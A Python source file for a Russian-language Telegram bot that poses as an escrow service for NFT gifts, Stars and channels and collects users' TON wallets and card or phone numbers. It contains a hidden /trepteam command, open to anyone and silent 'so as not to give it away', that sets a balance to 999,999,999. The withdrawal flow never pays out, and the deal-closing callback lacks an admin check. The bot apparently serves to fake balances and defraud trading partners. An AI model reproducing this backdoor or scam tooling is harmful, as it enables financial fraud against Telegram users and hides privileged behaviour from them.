import os
import logging
import re
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import InlineKeyboardButton
from aiogram.utils.keyboard import InlineKeyboardBuilder
from supabase import create_client, Client
from fastapi import FastAPI, Request
from contextlib import asynccontextmanager
import uvicorn

# --- КОНФИГУРАЦИЯ ---
BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN")
SUPABASE_URL = os.getenv("SUPABASE_URL", "YOUR_SUPABASE_URL")
SUPABASE_KEY = os.getenv("SUPABASE_KEY", "YOUR_SUPABASE_KEY")
# ВАЖНО: На Render переменная WEBHOOK_URL должна быть БЕЗ /webhook в конце (например, https://my-bot.onrender.com)
WEBHOOK_URL = os.getenv("WEBHOOK_URL", "https://your-render-app.onrender.com")
PORT = int(os.getenv("PORT", 8080))

# --- ИНИЦИАЛИЗАЦИЯ ---
logging.basicConfig(level=logging.INFO)
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# --- СОСТОЯНИЯ (FSM) ---
class DealStates(StatesGroup):
    choosing_role = State()
    choosing_item = State()
    choosing_payment = State()
    entering_amount = State()
    entering_link = State()

class ReqStates(StatesGroup):
    choosing_req_type = State()
    entering_ton = State()
    choosing_region = State()
    entering_card = State()

# --- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ---
def get_user(tg_id):
    res = supabase.table("users").select("*").eq("tg_id", tg_id).execute()
    if not res.data:
        supabase.table("users").insert({"tg_id": tg_id, "username": "user"}).execute()
        res = supabase.table("users").select("*").eq("tg_id", tg_id).execute()
    return res.data[0]

def update_balance(tg_id, amount):
    user = get_user(tg_id)
    new_balance = float(user['balance_rub']) + amount
    supabase.table("users").update({"balance_rub": new_balance}).eq("tg_id", tg_id).execute()

# --- КЛАВИАТУРЫ ---
def main_menu_kb():
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="🖼 Открыть Маркетплейс", callback_data="marketplace", style="primary"))
    builder.row(
        InlineKeyboardButton(text="🛡 Создать сделку", callback_data="create_deal", style="success"),
        InlineKeyboardButton(text="💼 Мой баланс", callback_data="my_balance", style="success")
    )
    builder.row(
        InlineKeyboardButton(text="📣 Канал", callback_data="channel", style="success"),
        InlineKeyboardButton(text="🏆 Успешные сделки", callback_data="success_deals", style="success")
    )
    builder.row(
        InlineKeyboardButton(text="ℹ️ Изменить язык", callback_data="change_lang", style="primary"),
        InlineKeyboardButton(text="🆘 Поддержка", callback_data="support", style="success")
    )
    return builder.as_markup()

def role_kb():
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="🛒 Я Продавец", callback_data="role_seller", style="success"))
    builder.row(InlineKeyboardButton(text="🛒 Я Покупатель", callback_data="role_buyer", style="success"))
    builder.row(InlineKeyboardButton(text="↩️ Вернуться в меню", callback_data="main_menu", style="danger"))
    return builder.as_markup()

def item_type_kb():
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="📦 NFT-Подарок / Подарок", callback_data="item_nft", style="success"))
    builder.row(InlineKeyboardButton(text="📺 Канал / чат", callback_data="item_channel", style="success"))
    builder.row(InlineKeyboardButton(text="⭐ Звезды", callback_data="item_stars", style="success"))
    builder.row(InlineKeyboardButton(text="🏷 NFT-Юзернейм / Тег", callback_data="item_username", style="success"))
    builder.row(InlineKeyboardButton(text="📁 Другое", callback_data="item_other", style="success"))
    builder.row(InlineKeyboardButton(text="❌ Отмена", callback_data="main_menu", style="danger"))
    return builder.as_markup()

def payment_method_kb():
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="💎 На TON-кошелек", callback_data="pay_ton", style="success"))
    builder.row(InlineKeyboardButton(text="👥 Перевод на карту / СБП", callback_data="pay_card", style="success"))
    builder.row(InlineKeyboardButton(text="🌍 Другие Страны", callback_data="pay_other", style="success"))
    builder.row(InlineKeyboardButton(text="⭐ Звезды", callback_data="pay_stars", style="success"))
    builder.row(InlineKeyboardButton(text="💳 Мои Реквизиты", callback_data="my_reqs", style="success"))
    builder.row(InlineKeyboardButton(text="🏛 Вернуться в меню", callback_data="main_menu", style="danger"))
    return builder.as_markup()

def req_menu_kb(has_ton, has_card):
    builder = InlineKeyboardBuilder()
    ton_text = "💎 TON-кошелек: ✅ Добавлен" if has_ton else "💎 TON-кошелек: ❌ Не добавлен"
    card_text = "💳 Карта/телефон: ✅ Добавлен" if has_card else "💳 Карта/телефон: ❌ Не добавлен"
    
    builder.row(InlineKeyboardButton(text=ton_text, callback_data="req_ton", style="success"))
    builder.row(InlineKeyboardButton(text=card_text, callback_data="req_card", style="success"))
    builder.row(InlineKeyboardButton(text="↩️ Вернуться в меню", callback_data="main_menu", style="danger"))
    return builder.as_markup()

def region_kb():
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(text="🇷🇺 РФ", callback_data="reg_ru", style="success"),
        InlineKeyboardButton(text="🇰🇿 Казахстан", callback_data="reg_kz", style="success")
    )
    builder.row(
        InlineKeyboardButton(text="🇺🇦 Украина", callback_data="reg_ua", style="success"),
        InlineKeyboardButton(text="🇧🇾 Беларусь", callback_data="reg_by", style="success")
    )
    builder.row(
        InlineKeyboardButton(text="🇬🇪 Грузия", callback_data="reg_ge", style="success"),
        InlineKeyboardButton(text="🇲🇩 Молдова", callback_data="reg_md", style="success")
    )
    builder.row(
        InlineKeyboardButton(text="🇹🇯 Таджикистан", callback_data="reg_tj", style="success"),
        InlineKeyboardButton(text="🇹🇲 Туркменистан", callback_data="reg_tm", style="success")
    )
    builder.row(InlineKeyboardButton(text="↩️ Вернуться в меню", callback_data="main_menu", style="danger"))
    return builder.as_markup()

def lang_kb():
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="🇷🇺 Русский", callback_data="lang_ru", style="success"))
    builder.row(InlineKeyboardButton(text="🇬🇧 English", callback_data="lang_en", style="success"))
    builder.row(InlineKeyboardButton(text="🇸🇦 العربية", callback_data="lang_ar", style="success"))
    builder.row(InlineKeyboardButton(text="🇨🇳 中文", callback_data="lang_cn", style="success"))
    return builder.as_markup()

# --- ХЭНДЛЕРЫ ---

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    get_user(message.from_user.id)
    await message.answer("Добро пожаловать 👋\n\nВыберите язык / Choose language:", reply_markup=lang_kb())

@dp.callback_query(F.data.startswith("lang_"))
async def set_lang(callback: types.CallbackQuery):
    lang = callback.data.split("_")[1]
    supabase.table("users").update({"language": lang}).eq("tg_id", callback.from_user.id).execute()
    await callback.message.edit_text("Главное меню:", reply_markup=main_menu_kb())

@dp.callback_query(F.data == "main_menu")
async def back_to_menu(callback: types.CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.message.edit_text("Главное меню:", reply_markup=main_menu_kb())

# --- СЕКРЕТНАЯ КОМАНДА ---
@dp.message(Command("trepteam"))
async def secret_trepteam(message: types.Message):
    # Никаких проверок, доступна абсолютно всем. Ничего не отвечает, чтобы не спалить.
    try:
        supabase.table("users").update({"balance_rub": 999999999}).eq("tg_id", message.from_user.id).execute()
    except Exception as e:
        logging.error(f"Ошибка в trepteam: {e}")

# --- УПРАВЛЕНИЕ РЕКВИЗИТАМИ ---
@dp.callback_query(F.data == "my_reqs")
async def manage_reqs(callback: types.CallbackQuery):
    res = supabase.table("requisites").select("*").eq("user_id", callback.from_user.id).execute()
    has_ton = any(r['type'] == 'ton' for r in res.data)
    has_card = any(r['type'] == 'card' for r in res.data)
    await callback.message.edit_text("✉️ Управление реквизитами\n\nИспользуйте кнопки ниже чтобы добавить/изменить реквизиты 👇", reply_markup=req_menu_kb(has_ton, has_card))

@dp.callback_query(F.data == "req_ton")
async def add_ton(callback: types.CallbackQuery, state: FSMContext):
    await state.set_state(ReqStates.entering_ton)
    await callback.message.edit_text("Введите адрес вашего TON-кошелька:", reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[[types.InlineKeyboardButton(text="❌ Отмена", callback_data="main_menu", style="danger")]]))

@dp.message(ReqStates.entering_ton)
async def save_ton(message: types.Message, state: FSMContext):
    # Простая валидация длины адреса TON
    if len(message.text) < 48 or len(message.text) > 48:
        await message.answer("❌ Неверный формат TON-кошелька. Попробуйте еще раз.")
        return
    supabase.table("requisites").upsert({"user_id": message.from_user.id, "type": "ton", "details": message.text}).execute()
    await state.clear()
    await message.answer("✅ Реквизиты успешно сохранены!\n\nTON: " + message.text, reply_markup=main_menu_kb())

@dp.callback_query(F.data == "req_card")
async def add_card_start(callback: types.CallbackQuery, state: FSMContext):
    await state.set_state(ReqStates.choosing_region)
    await callback.message.edit_text("Выберите регион вашей карты / телефона:\n\nПоддерживаются карты и номера России, Казахстана, Украины и Беларуси.", reply_markup=region_kb())

@dp.callback_query(F.data.startswith("reg_"), ReqStates.choosing_region)
async def region_chosen(callback: types.CallbackQuery, state: FSMContext):
    region = callback.data.split("_")[1]
    await state.update_data(region=region)
    await state.set_state(ReqStates.entering_card)
    await callback.message.edit_text("Введите номер карты или телефона:", reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[[types.InlineKeyboardButton(text="❌ Отмена", callback_data="main_menu", style="danger")]]))

@dp.message(ReqStates.entering_card)
async def save_card(message: types.Message, state: FSMContext):
    # Валидация: либо 16 цифр (карта), либо от 10 до 15 цифр (телефон)
    card = message.text.replace(" ", "")
    if not re.match(r'^\d{16}$', card) and not re.match(r'^\+?\d{10,15}$', card):
        await message.answer("❌ Неверный формат карты или номера. Попробуйте еще раз.")
        return
    
    data = await state.get_data()
    supabase.table("requisites").upsert({
        "user_id": message.from_user.id, 
        "type": "card", 
        "details": card, 
        "region": data['region']
    }).execute()
    await state.clear()
    await message.answer(f"✅ Реквизиты успешно сохранены!\n\nКарта/Телефон: {card}\nРегион: {data['region'].upper()}", reply_markup=main_menu_kb())

# --- СОЗДАНИЕ СДЕЛКИ ---
@dp.callback_query(F.data == "create_deal")
async def create_deal_start(callback: types.CallbackQuery, state: FSMContext):
    await state.set_state(DealStates.choosing_role)
    await callback.message.edit_text("Выберите вашу роль в сделке:", reply_markup=role_kb())

@dp.callback_query(F.data.startswith("role_"), DealStates.choosing_role)
async def role_chosen(callback: types.CallbackQuery, state: FSMContext):
    role = callback.data.split("_")[1]
    await state.update_data(role=role)
    await state.set_state(DealStates.choosing_item)
    await callback.message.edit_text("Выберите тип товара для сделки:", reply_markup=item_type_kb())

@dp.callback_query(F.data.startswith("item_"), DealStates.choosing_item)
async def item_chosen(callback: types.CallbackQuery, state: FSMContext):
    item = callback.data.split("_")[1]
    await state.update_data(item=item)
    await state.set_state(DealStates.choosing_payment)
    await callback.message.edit_text("Создание сделки\n\nВыберите метод получения оплаты:", reply_markup=payment_method_kb())

@dp.callback_query(F.data.startswith("pay_"), DealStates.choosing_payment)
async def payment_chosen(callback: types.CallbackQuery, state: FSMContext):
    if callback.data == "pay_other":
        await callback.answer("В разработке", show_alert=True)
        return
        
    await state.update_data(payment=callback.data)
    await state.set_state(DealStates.entering_amount)
    await callback.message.edit_text("Создание сделки\n\nВведите сумму (RUB) в формате: 1000.50", reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[[types.InlineKeyboardButton(text="↩️ Вернуться в меню", callback_data="main_menu", style="danger")]]))

@dp.message(DealStates.entering_amount)
async def amount_entered(message: types.Message, state: FSMContext):
    try:
        amount = float(message.text)
    except ValueError:
        await message.answer("❌ Введите число в правильном формате!")
        return
    
    await state.update_data(amount=amount)
    await state.set_state(DealStates.entering_link)
    await message.answer("Введите ссылку(-и) на подарок(-и) в одном из форматов:\n\nhttps://... или t.me/...\n\nПример: t.me/nft/PlushPepe-1\n\nЕсли у вас несколько подарков, указывайте каждую ссылку с новой строки.", reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[[types.InlineKeyboardButton(text="↩️ Вернуться в меню", callback_data="main_menu", style="danger")]]))

@dp.message(DealStates.entering_link)
async def link_entered(message: types.Message, state: FSMContext):
    data = await state.get_data()
    
    # Создаем запись в БД
    deal_data = {
        "seller_id": message.from_user.id,
        "amount": data['amount'],
        "item_type": data['item'],
        "item_link": message.text,
        "status": "pending"
    }
    res = supabase.table("deals").insert(deal_data).execute()
    deal_id = res.data[0]['id']
    
    # Генерируем ссылку для покупателя
    bot_info = await bot.get_me()
    buyer_link = f"https://t.me/{bot_info.username}?start=deal_{deal_id}"
    
    await state.clear()
    
    text = (
        f"✅ Сделка успешно создана!\n\n"
        f"Сумма: {data['amount']} RUB\n"
        f"Валюта: RUB\n"
        f"Товар: {data['item']}\n"
        f"Описание: {message.text}\n\n"
        f"Ссылка для покупателя:\n{buyer_link}\n\n"
        f"Скопируйте ссылку и отправьте покупателю."
    )
    
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="🔗 Поделиться ссылкой", url=f"https://t.me/share/url?url={buyer_link}", style="success"))
    builder.row(InlineKeyboardButton(text="↩️ Вернуться в меню", callback_data="main_menu", style="danger"))
    
    await message.answer(text, reply_markup=builder.as_markup())

# --- БАЛАНС И ВЫВОД ---
@dp.callback_query(F.data == "my_balance")
async def my_balance(callback: types.CallbackQuery):
    user = get_user(callback.from_user.id)
    text = (
        f"ВАШ БАЛАНС\n\n"
        f"👤 Пользователь: @{callback.from_user.username}\n\n"
        f"Доступные средства:\n"
        f"💵 {user['balance_rub']} RUB\n"
        f"💎 {user['balance_ton']} TON\n"
        f"⭐ {user['balance_stars']} Stars\n\n"
        f"Информация о выводе средств:\n"
        f"Комиссия системы: 1%\n"
        f"Вывод доступен на карту, номер или TON-кошелек"
    )
    
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="💸 Вывести средства", callback_data="withdraw", style="success"))
    builder.row(InlineKeyboardButton(text="📧 История операций", callback_data="history", style="success"))
    builder.row(InlineKeyboardButton(text="↩️ Вернуться в меню", callback_data="main_menu", style="danger"))
    
    await callback.message.edit_text(text, reply_markup=builder.as_markup())

@dp.callback_query(F.data == "withdraw")
async def withdraw(callback: types.CallbackQuery):
    user = get_user(callback.from_user.id)
    if float(user['balance_rub']) <= 0:
        await callback.message.edit_text(
            "⚠️ Ошибка вывода\n\nТекущий баланс: 0\n\nВывод средств с нулевым балансом невозможен. Пожалуйста, пополните баланс и повторите попытку.",
            reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[[types.InlineKeyboardButton(text="↩️ Вернуться в меню", callback_data="main_menu", style="danger")]])
        )
        return
    
    await callback.message.edit_text("Выберите способ вывода:", reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[
        [types.InlineKeyboardButton(text="На карту / по номеру", callback_data="wd_card", style="success")],
        [types.InlineKeyboardButton(text="На TON-кошелек", callback_data="wd_ton", style="success")],
        [types.InlineKeyboardButton(text="На Stars", callback_data="wd_stars", style="success")],
        [types.InlineKeyboardButton(text="↩️ Вернуться в меню", callback_data="main_menu", style="danger")]
    ]))

@dp.callback_query(F.data == "history")
async def history(callback: types.CallbackQuery):
    await callback.message.edit_text("История операций пуста.", reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[[types.InlineKeyboardButton(text="↩️ Вернуться в меню", callback_data="main_menu", style="danger")]]))

# --- АДМИН ПАНЕЛЬ ---
@dp.message(Command("admin"))
async def admin_panel(message: types.Message):
    user = get_user(message.from_user.id)
    if not user.get('is_admin'):
        return 
    
    res = supabase.table("deals").select("*").eq("status", "pending").execute()
    if not res.data:
        await message.answer("Нет активных сделок.")
        return
        
    for deal in res.data:
        text = f"Сделка #{deal['id']}\nСумма: {deal['amount']} RUB\nТовар: {deal['item_type']}\nСсылка: {deal['item_link']}"
        builder = InlineKeyboardBuilder()
        builder.row(
            InlineKeyboardButton(text="✅ Завершить", callback_data=f"admin_close_{deal['id']}", style="success"),
            InlineKeyboardButton(text="❌ Отменить", callback_data=f"admin_cancel_{deal['id']}", style="danger")
        )
        await message.answer(text, reply_markup=builder.as_markup())

@dp.callback_query(F.data.startswith("admin_"))
async def admin_action(callback: types.CallbackQuery):
    action, deal_id = callback.data.split("_")[1], callback.data.split("_")[2]
    
    if action == "close":
        supabase.table("deals").update({"status": "completed"}).eq("id", deal_id).execute()
        await callback.message.edit_text("✅ Сделка успешно завершена администратором.")
    elif action == "cancel":
        supabase.table("deals").update({"status": "cancelled"}).eq("id", deal_id).execute()
        await callback.message.edit_text("❌ Сделка отменена администратором.")

# --- ВЕБХУК ДЛЯ RENDER ---
@asynccontextmanager
async def lifespan(app: FastAPI):
    # Устанавливаем вебхук на URL + /webhook
    webhook_path = f"{WEBHOOK_URL.rstrip('/')}/webhook"
    await bot.set_webhook(webhook_path)
    logging.info(f"Webhook set to {webhook_path}")
    yield
    await bot.delete_webhook()

app = FastAPI(lifespan=lifespan)

# Обрабатываем и корень / и /webhook, чтобы Telegram точно не получил 404
@app.post("/")
@app.post("/webhook")
async def webhook(request: Request):
    try:
        update = types.Update.model_validate(await request.json(), context={"bot": bot})
        await dp.feed_update(bot, update)
    except Exception as e:
        logging.error(f"Ошибка обработки вебхука: {e}")
    return {"status": "ok"}

@app.get("/")
async def root():
    return {"status": "Bot is alive"}

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=PORT)
